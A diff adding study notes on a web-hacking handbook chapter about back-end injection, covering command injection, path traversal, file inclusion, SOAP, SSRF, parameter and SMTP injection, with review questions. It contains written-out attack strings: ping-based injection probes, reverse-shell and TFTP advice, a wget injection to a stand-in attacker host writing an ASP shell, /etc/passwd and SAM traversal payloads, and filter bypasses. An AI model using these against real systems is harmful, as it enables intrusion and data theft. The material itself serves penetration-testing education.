@@ -1,0 +1,358 @@
+ATTACKING BACK-END COMPONENTS
+
+************************************************************
+I. Injection OS Commands
+	1. Example 1: Injecting Via Perl
+	2. Example 2: Injecting Via ASP
+	3. Injecting Through Dynamic Execution
+	4. Finding OS Command Injection Flaws
+		HACK STEPS:
+			1. You can normally use the ping command as a means of triggering a time delay by causing the server to ping its loopback interface for a specific period. There are minor differences between how Windows and UNIX-based platform handle command separators and the ping command. However, the following all-purpose test string should induce a 30-second time delay on either platform if no filtering is in place:
+					|| ping -i 30 127.0.0.1; x || ping -n 30 127.0.0.1 &
+			To maximize your chances of detecting a command injection flaw if the application is filtering certain command separators, you should also submit each of the following test strings to each targeted parameter in turn and monitor the time taken for the application to respond:
+					| ping –i 30 127.0.0.1 |
+					| ping –n 30 127.0.0.1 |
+					& ping –i 30 127.0.0.1 &
+					& ping –n 30 127.0.0.1 &
+					; ping 127.0.0.1 ;
+				%0a ping –i 30 127.0.0.1 %0a
+				` ping 127.0.0.1 `
+			2. If a time delay occurs, the application may be vulnerable to command injection. Repeat the test case several times to confirm that the delay was not the result of network latency or other anomalies. You can try changing the value of the -n or -i parameters and confirming that the delay experienced varies systematically with the value supplied.
+			3. Using whichever of the injection strings was found to be successful, try injecting a more interesting command (such as ls or dir). Determine whether you can retrieve the results of the command to your browser.
+			4. If you are unable to retrieve results directly, you have other options"
+				- You can attempt to open an out-of-band channel back to your computer. Trying using TFTP to copy tools up to the server, using telnet or netcat to create a reverse shell back to your computer, and using the mail command to send command output via SMTP.
+				- You can redirect the results of your commands to a file within the web root, which you can then retrieve directly using your browser. For example: 		
+						dir > c:\inetpub\wwwroot\foo.txt
+			5. When you have found a means of injecting commands and retrieving the results, you should determine your privilege level (by using whoami or something similar, or attempting to write a harmless file to protected directory). You may then seek to escalte privileges, gain backdoor access to sensitive application data, or attack other hosts reachable from the compromised server.			
+						
+		HACK STEPS:
+			1. The < and > characters are used, respectively, to direct the contents of a file to the command's input and to direct the command's output to file. If it not possible to use the preceding techniques to inject an entirely separate command, you may still be able to read and write arbitrary file contents using the < and > characters.
+			2. Many operating system commands that applications invoke accept a number of command-line parameters that control behavior. Often, user-supplied input is passed to the command as one of these parameters, and you may be able to add further parameters simply by inserting a space followed by the relevant parameter. For example, a web-authoring application may contain a function in which the server retrieves a user-specified URL and renders its content in-browser for editing. If the application simply calls out to the wget program, you may be able to write arbitrary file contents to the server's filesystem by appending the -o command-line parameter used by wget. For example:
+						url=http://wahh-attacker.com/%20-O%20c:\inetpub\wwwroot\scripts\cmdasp.asp		
+						
+	5. Finding Dynamic Execution Vulnerabilities
+		HACK STEPS:
+			1. Any item of user-supplied data may be passed to a dynamic execution function. Some of the items most commonly used in this way are the names and values of cookie parameters and persistent data stored in user profiles as the result of previous actions.						
+			2. Try submitting the following values in turn as each targeted parameter:
+					;echo%20111111
+					echo%20111111
+					response.write%20111111
+					:response.write%20111111
+			3. Review the application's responses. If the string 111111 is returned on its own (is not preceded by the rest of the command string), the application is likely to be vulnerable to the injection of scripting commands.
+			4. If the string 111111 is not returned, look for any error messages that indicate that your input is being dynamically executed and that you may need to fine-tune your syntax to achieve injection of arbitrary commands.
+			5. If the application you are attacking uses PHP, you can use the test string phpinfo(), which, if successful, returns the configuration details of the PHP environment.
+			6. If the application appears to be vulnerable, verify this by injecting some commands that result in time delays, as described previously for OS command injection. For example:
+					system(‘ping%20127.0.0.1’)
+	
+	6. Preventing OS Command Injection
+	7. Preventing Script Injection Vulnerabilities
+
+*************************************************************************
+II. Manipulating File Paths
+	1. Path Traversal Vulnerabilities
+		1.1. Finding and Exploiting Path Traversal Vulnerabilities
+			1.1.1. Locating Targets for Attack
+				HACK STEPS:
+					1. Review the information gathered during application mapping to identify the following:
+						- Any instance where a request parameter appears to contain the name of a file or directory, such as include=main.inc or template=/en/sidebar.
+						- Any application functions whose implementation is likely to involve retrieval of data from a server file system (as opposed to a back-end database), such as the displaying of office documents or images
+					2. During all testing you perform in relation to every other kind of vulnerability, look for error messages or other anomalous events that are of interest. Try to find any evidence of instances where user-supplied data is being passed to file APIs or as parameters to operating system commands.
+				
+				HACK STEPS:
+					If you have local access to the web application, do the following:
+						1. Use a suitable tool to monitor all file system activity on the server. For example, the FileMon tool from SysInternals can be used on the Windows platform, the ltrace/strace tools can be used on Linux, and the truss command can be used on Sun's Solaris.
+						2. Test every page of the application by inserting a single unique string (such as traversaltest) into each submiited parameter (including all cookies, query string fields, and POST data items). Target only one parameter at a time, and use the automated techniques described in Chapter 14 to speed up the process.
+						3. Set a filter in your file system monitoring tool to identify all file system events that contain your test string.
+						4. If any events are identified where your test string has been used as or incorporated into a file or directory name, test each instance (as described next) to determine whether it is vulnerable to path traversal attacks
+			
+			1.1.2. Detecting Path Traversal Vulnerabilities
+				HACK STEPS:
+					1. Working on the assumption that the parameter you are targeting is being appended to a preset directory specified by the application, modify the parameter's value to insert an arbitrary subdirectory and a single traversal sequence. For example, if the application submits this parameter:
+							file=foo/file1.txt
+						try submitting this value:
+							file=foo/bar/../file1.txt
+						If the application's behavior is identical in the two cases, it may be vulnerable. You should proceed directly to attempting to access a different file by traversing above the start directory.
+						
+					2. If the application's behavior is different in the two cases, it may be blocking stripping, or sanitizing traversal sequences, resulting in an invalid file path. You should examine whether there are any ways to circumvent the application's validation filters.
+						The reason why this test is effective, even if the subdirectory "bar" does not exist, is that most common file systems perform canonicalization of the file path before attempting to retrieve it. The traversal sequence cancels out the invented directory, so the server does not check whether it is present.
+						
+				HACK STEPS:
+					1. If the application function you are attacking provides read access to a file attempt to access a known world-readable file on the operating system in question. Submit one of the following values as the filename parameter you control:
+							../../../../../../../../../../../../etc/passwd
+							../../../../../../../../../../../../windows/win.ini
+						If you are lucky, your browser displays the contents of the file you have requested.
+					2. If the function you are attacking provides write access to a file, it may be more difficult to verify conclusively whether application is vulnerable. One test that is often effective is to attempt to write two files - one that should be writable by any user, and one that should not be writable even by root or Administrator. For example, on Windows platforms you can try this:
+							../../../../../../../../../../../../writetest.txt
+							../../../../../../../../../../../../windows/system32/config/sam
+						On UNIX-based platforms, files that root may not write are version-dependent, but attempting to overwrite a directory with a file should always fail, so you can try this:
+							../../../../../../../../../../../../tmp/writetest.txt
+							../../../../../../../../../../../../tmp
+						For each pair of tests, if the application's behavior is different in response to the first and second requests (for example, if the second returns an error message but the first does not), the application probably is vulnerable.
+					3. An alternative method for verifying a traversal flaw with write access is to try write a new file within the web root of the web server and then attempt to retrieve this with a browser. However, this method may not work if you do not know the location of the web root directory or if the user context in which the file access occurs does not have permission to write there.
+					
+			1.1.3. Circumventing Obstacles to Traversal Attacks
+				HACK STEPS:
+					1. Always try path traversal sequences using both forward slashes and back-slashes. Many input filters check for only one of these, when the file system may support both.
+					2. Try simple URL-encoded representations of traversal sequences using the following encoding. Be sure to encode every single slash and dot within your input:
+							- Dot — %2e
+							- Forward slash — %2f
+							- Backslash — %5c	
+					3. Try using 16-bit Unicode encoding:
+							- Dot — %u002e
+							- Forward slash — %u2215
+							- Backslash — %u2216
+					4. Try double URL encoding:
+							- Dot — %252e
+							- Forward slash — %252f
+							- Backslash — %255c
+					5. Try overlong UTF-8 Unicode encoding:
+							- Dot — %c0%2e, %e0%40%ae, %c0ae, and so on
+							- Forward slash — %c0%af, %e0%80%af, %c0%2f, and so on
+							- Backslash — %c0%5c, %c0%80%5c, and so on
+						You can use the illegal Unicode payload type within Burp Intruder to generate a hug number of alternate representations of any given character and submit this at the relevant place within your target parameter. These representations strictly violate the rules for Unicode representation but nevertheless are accepted by many implementations of Unicode decoders, particularly on the Windows platform.
+					6. If the application is attempting to sanitize user input by removing traversal sequences and does not apply this filter recursively, it may be possible to bypass the filter by placing one sequence within another. For example:
+							....//
+							....\/
+							..../\
+							....\\
+					
+				HACK STEPS:
+					1. Some applications check whether the user-supplied filename ends in a particular file type or set of file types and reject attempts to access anything else. Sometimes this check can be subverted by placing a URL encoded null byte at the end of your requested filename, followed by a file type that the application accepts. For example:
+							../../../../../boot.ini%00.jpg
+						The reason this attack sometimes succeeds is that the file type check is implemented using an API in a managed execution environment in which strings are permitted to contain null characters (such as String.endsWith() in Java). However, when the file is actually retrieved, the application ultimately uses an API in a unmanaged environment in which strings are null-terminated. Therefore, your filename is effectively truncated to your desired value.
+					2. Some applications attempt to control the file type being accessed by appending their own file-type suffix to the filename supplied by the user. In this situation, either of the preceding exploits may be effective, for the same reasons.
+					3. Some applications check whether the user-supplied filename starts with a particular subdirectory of the start directory, or even a specific filename. This check can, of course, be bypassed easily as follows:
+							filestore/../../../../../../../etc/passwd
+					4. If none of the preceding attacks against input filters is successful individually, the application might be implementing multiple types of filters. Therefore, you need to combine several of these attacks simultaneously (both against traversal sequence filters and file type or directory filters). If possible, the best approach here is to try to break the problem into separate stages. For example, if the request for:
+							diagram1.jpg
+						is successful, but the request for:
+							foo/../diagram1.jpg
+						fails, try all these possible traversal sequence bypasses until a variation on the second request is successful. If these successful traversal sequence bypasses don't enable you to access /etc/passwd, probe whether any file type filtering is implemented and can be bypassed by requesting:
+							diagram1.jpg%00.jpg
+						Working entirely within the start directory defined by the application, try to probe to understand all the filters being implemented, and see whether each can be bypassed individually with the techniques described.
+					5. If course, if you have whitebox access to the application, your task is much easier, because you can systematically work through different types of input and verify conclusively what filename (if any) is actually reaching the file system.
+						
+			1.1.4. Coping with Custom Encoding		
+			1.1.5. Exploiting Traversal Vulnerabilities
+				HACK STEPS:
+					You can exploit read access path traversal flaws to retrieve interesting files from the server that may contain directly useful information or that help you refine attacks against other vulnerabilities. For example:
+						- Password files for the operating system and application
+						- Server and application configuration files to discover other vulnerabilities or fine-tune a different attack
+						- Include files that may contain database credentials
+						- Data sources used by the application, such as MySQL database files or XML files
+						- The source code to server-executable pages to perform a code review in search of bugs (for example, GetImage.aspx?file=GetImage.aspx)
+						- Application log files that may contain usernames and session tokens and the like
+					If you find a path traversal vulnerability that grants write access, your main goal should be to exploit this to echieve arbitrary execution of commands on the server. Here are some ways to exploit this vulnerability:
+						- Create scripts in users' startup 	 folders.
+						- Modify files such as in.ftpd to execute arbitrary commands when a user next connects.
+						- Write scripts to a web directory with execute permissions, and call them from your browser.
+						
+		1.2. Preventing Path Traversal Vulnerabilities
+	
+	2. File Inclusion Vulnerabilities
+		2.1. Remote File Inclusion
+		2.2. Local File Inclusion
+		2.3. Finding File Inclusion Vulnerabilities
+			HACK STEPS:
+				To test for remote file inclusion flaws, follow these steps:
+					1. Submit in each target parameter a URL for a resource on a web server you control, and determine whether any request are received from the server hosting the target application.
+					2. If the first test fails, try submitting a URL containing a non existent IP address, and determine whether a timeout occurs while the server attempts to connect.
+					3. If the application is found to be vulnerable to remote file inclusion, construct a malicious script using the available APIs in the relevant language, as described for dynamic execution attacks.
+					
+				Local file inclusion vulnerabilities can potentially exist in a much wider range of scripting environments than those that support remote file inclusion. To test for local file inclusion vulnerabilities, follow these steps:
+					1. Submit the name of a known executable resource on the server, and determine whether any change occurs in the application's behavior.
+					2. Submit the name of a known static resource on the server, and determine whether its contents are copied into the application's response.
+					3. If the application is vulnerable to local file inclusion, attempt to access any sensitive functionality or resources that you cannot reach directly via the web server.
+					4. Test to see if you can access files in other directories using the traversal techniques described previously.
+
+*********************************************************************************************************
+III. Injecting into XML Interpreters
+ 1. Injecting XML External Entities
+ 2. Injecting into SOAP Services
+ 3. Finding and Exploiting SOAP Injection
+ 	HACK STEPS:
+		1. Submit a rogue XML closing tag such as </foo> in each parameter in turn. If no error occurs, your input is probably not being inserted into a SOAP message, or it is being sanitized in some way.
+		2. If an error was received, submit instead a valid opening and closing tag pair, such as <foo></foo>. If this causes the error to disappear, the application may be vulnerable.
+		3. In some situations, data that is inserted into an XML-formatted message is subsequently read back from its XML form and returned to the user. If the item you are modifying is being returned in the application's responses, see whether any XML content you submit is returned in its identical form or has been normalized in some way. Submit the following two values in turn:
+				test <foo/>
+				test <foo></foo>
+			If you find that either item is returned as the other, or simply as test, you can be confident that your input is being inserted into an XML-based message.
+		4. If the HTTP request contains several parameters that may be being place into a SOAP message, try inserting the opening comment character (<!--) into one parameter and the closing comment character (!-->) into another parameter. Then switch these around (because you have no way of knowing in which order the parameters appear). Doing so can have the effect of commenting out a portion of the server's SOAP message. This may cause a change in the application's logic or result in a different error condition that may divulge information.
+ 
+	4. Preventing SOAP Injection
+
+******************************************************************
+IV. Injecting into Back-end HTTP Requests
+	1. Server-side HTTP Redirection
+		HACK STEPS:
+			1. Identify any request parameters that appear to contain hostnames, IP addresses, or full URLs.
+			2. For each parameter, modify its value to specify an alternative resource, similar to the one being requested, and see if that resource appears in the server's response.
+			3. Try specifying a URL targeting a server on the Internet that you control, and monitor that server for incoming connections from the application you are testing.
+			4. If no incoming connection is received, monitor the time taken for the application to respond. If there is a delay, the application's back-end requests may be timing out due to network restrictions on outbound connections.
+			5. If you are successful in using the functionality to connect to arbitrary URLs, try to perform the following attacks:
+				a. Determine whether the port number can be specified. For example, you might supply http://mdattacker.net:22
+				b. If successful, attempt to port-scan the internal network by using a tool such as Burp Intruder to connect to a range of IP addresses and ports in sequence.
+				c. Attempt to connect to other services on the loopback address of the application server.
+				d. Attempt to load a web page that you control into the application's response to deliver a cross-site scripting attack.
+	
+	2. HTTP Parameter Injection
+		2.1. HTTP Parameter Pollution
+		2.2. Attacks Against URL Translation
+		
+		HACK STEPS:
+			1. Target each request parameter in turn, and try to append a new injected parameter using various syntax:
+				%26foo%3dbar - URL-encode &foo=bar
+				%3bfoo%3dbar - URL-encode ;foo=bar
+				%2526foo%253dbar - Double URL-encode &foo=bar
+			2. Identify any instances where the application behaves as if the original parameter were unmodified. (This applies only to parameters that usually cause some difference in the application's response when modified).
+			3. Each instance identified in the previous step has a chance of parameter injection. Attempt to inject a known parameter at various points in the request to see if it can override or modify an existing parameter. For example:
+					FromAccount=18281008%26Amount%3d4444&Amount=1430&ToAccount=08447656
+			4. If this causes the new value to override the existing one, determine whether you can bypass any front-end validation by injecting a value that is ready by a back-end server.
+			5. Replace the injected known parameter with additional parameter names as described for application mapping and content discovery in Chapter 4.
+			6. Test the application's tolerance of multiple submissions of the same parameter within a request. Submit redundant values before and after other parameters, and at different locations within the request (within the query string, cookies, and the message body).
+			
+****************************************************************************
+V. Injecting into Mail Services
+	1. E-mail Header Manipulation
+	2. SMTP Command Injection
+	3. Finding SMTP Injection Flaws
+		HACK STEPS:
+			1. You should submit each of the following test strings as each parameter in turn, inserting your own e-mail address at the relevant position:
+					<youremail>%0aCc:<youremail>
+					<youremail>%0d%0aCc:<youremail>
+					<youremail>%0aBcc:<youremail>
+					<youremail>%0d%0aBcc:<youremail>
+					%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<y
+					ouremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aS
+					ubject:+test%0afoo%0a%2e%0a
+					%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0
+					d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%
+					0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0
+					afoo%0d%0a%2e%0d%0a
+			2. Note any error messages the application returns. If these appear to relate to any problem in the e-mail function, investigate whether you need to fine-tune your input to exploit a vulnerability.
+			3. The application’s responses may not indicate in any way whether a vulnerability exists or was successfully exploited. You should monitor the e-mail address you specified to see if any mail is received.
+			4. Review closely the HTML form that generates the relevant request. This may contain clues about the server-side software being used. It may also contain a hidden or disabled field that specifies the e-mail’s To address, which you can modify directly.
+	
+	4. Preventing SMTP Injection
+
+************************************************************************************
+SUMMARY
+	We have examined a wide range of attacks targeting back-end application components and the practical steps you can take to identify and exploit each one. Many real-world vulnerabilities can be discovered within the first few seconds of interacting with an application. For example, you could enter some unexpected syntax into a search box. In other cases, these vulnerabilities may be highly subtle, mainifesting themselves in scarcely detectable differences in the application's behavior, or reachable only through a multistage process of submitting and manipulating crafted input.
+	To be confident that you have uncovered the back-end injection flaws that exist within an application, you need to be both thorough and patient. Practically every type of vulnerability can manifest itself in the processing of practically any item of user-supplied data, including the names and values of query string parameters, POST data and cookies, and other HTTP headers. In many cases, a defect emerges only after extensive probing of the relevant parameter as you learn exactly what type of processing is being performed on your input and scrutinize the obstacles that stand in your way.
+	Faced with the huge potential attack surface presented by potential attacks against back-end application components, you may feel that any serious assault on an application must entail a titanic effort. However, part of learning the art of attacking software is to acquire a sixth sense for where the treasure is hidden and how your target is likely to open up so that you can steal it. The only way to gain this sense is through practice. You should rehearse the techniques we have described against the real-life applications you encounter and see how they stand up.
+	
+************************************************************************************
+QUESTIONS
+
+1. A network device provides a web-based interface for performing device configuration. Why is this kind of functionality often vulnerable to OS command injection attacks?
+	- Answer: Applications for configuring networking devices often contain functionality that can not be easily implemented using normal web scripting APIs, such the ability to reboot the device, cycle log files, or reconfigure SNMP. These tasks can often be performed easily using one-line operating system commands. Therefore, application developers frequently implement the functionality by incorporating the relevant user input directly into a shell command string.
+
+2. You are testing the following URL:
+			http://wahh-app.com/home/statsmgr.aspx?country=US
+			
+		Changing the value of the country parameter to foo results in this error message:
+			Could not open file: D:\app\default\home\logs\foo.log (invalid file).
+			
+		What steps could you take to attack the application?
+	- Answer: It appears that the user-supplied input is being incorporated into a file path is used in a filesystem operation. It may be possible to provide crafted input to access arbitrary files on the server. You should try using ../ traversal sequences to access different directories. Since .log is being appended to your input, you should try using a NULL byte to terminate the filename. Note that the home directory that appears within the error message might be the same directory that appears within the URL, giving you a clue about the location of items within the web root.
+	
+	
+3. You are testing an AJAX application that sends data in XML format within POST requests. What kind of vulnerability might enable you to read arbitrary files from the server’s filesystem? What prerequisites must be in place for your attack to succeed?
+	- Answer: The application may be vulnerable to XMP external entity (XXE) injection. The prerequisites to retrieve the content of arbitrary files would normally be as follow:
+			a. The XML interpreter used by the application must support external entities
+			b. The application must echo in its response the contents of an XML element that appears within the request
+
+4. You make the following request to an application that is running on the ASP.NET platform:
+				POST /home.aspx?p=urlparam1&p=urlparam2 HTTP/1.1
+				Host: wahh-app.com
+				Cookie: p=cookieparam
+				Content-Type: application/x-www-form-urlencoded
+				Content-Length: 15
+				p=bodyparam
+				
+		The application executes the following code:
+				String param = Request.Params[“p”];
+				
+		What value does the param variable have?
+	- Answer: The variable param has the value urlparam1,urlparam2,bodyparam,cookieparam
+		
+5. Is HPP a prerequisite for HPI, or vice versa?
+	- Answer: Although HPI attacks often involve HPP, they need not do so. For example, an HPI attack may inject an entirely new parameter into back-end request, to interfere with the application's processing. This type of attack does not depend upon any particular behavior in the application's handling of multiple parameters with the same name.
+				HPP attacks can often be used in situations that do not involve HPI, particular where several layers of processing is performed on user input. For example, some exploits against the Internet Explorer XSS filter use HPP techniques, but do no inject any parameter into back-end request.
+
+6. An application contains a function that proxies requests to external domains and returns the responses from those requests. To prevent server-side redirection attacks from retrieving protected resources on the application’s own web server, the application blocks requests targeting localhost or	127.0.0.1 . How might you circumvent this defense to access resources on the server?
+	- Answer:There are many alternative representations of the server's loopback IP address that could be used to bypass the application's filter. For example:
+				127.1
+				127.000.0.1
+				Any other address in the 127.0.0.0 Class A subnet
+				Any variations on these in binary or octal representations such as 017700000001
+
+7. An application contains a function for user feedback. This allows the user to supply their e-mail address, a message subject, and detailed comments. The application sends an email to feedback@wahh-app.com, addressed from the user’s email address, with the user-supplied subject line and comments in the message body. Which of the following is a valid defense against mail injection attacks?
+			(a) Disable mail relaying on the mail server.
+			(b) Hardcode the RCPT TO fi eld with feedback@wahh-app.com.
+			(c) Validate that the user-supplied inputs do not contain any newlines or
+other SMTP metacharacters.
+	- Answer:
+
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+							
+		
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+							
+	
+
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
